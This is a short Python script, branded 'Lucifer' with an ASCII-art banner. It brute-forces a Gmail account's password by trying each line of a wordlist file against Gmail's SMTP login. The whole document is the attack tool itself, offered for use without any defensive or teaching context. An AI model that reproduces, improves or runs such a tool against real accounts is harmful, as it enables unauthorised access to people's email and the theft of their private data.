import os
os.system("clear")
v = "\033[0;31m"
s = "\033[0;34m"
print(s+' _       _   _   _____   _   _____   _____   _____   ')
print(s+'| |     | | | | /  ___| | | |  ___| | ____| |  _  \  ')
print(s+'| |     | | | | | |     | | | |__   | |__   | |_| |  ')
print(s+'| |     | | | | | |     | | |  __|  |  __|  |  _  /  ')
print(s+'| |___  | |_| | | |___  | | | |     | |___  | | \ \  ')
print(s+'|_____| \_____/ \_____| |_| |_|     |_____| |_|  \_\ ')
print(v+"Lucifer")

import smtplib
Lucifer = smtplib.SMTP("smtp.gmail.com",587)
Lucifer. ehlo ()
Lucifer. starttls()
user = input ("enter email :===>>")
passwfil = input ("enter password file:==>")
passwfil = open (passwfil ,"r")
for password in passwfil: 
    try:
        Lucifer.login (user, password)
        print ("password found ==>" ,password)
        break 
    except smtplib.SMTPAuthenticationError:
        print ("password not found ==>",password)


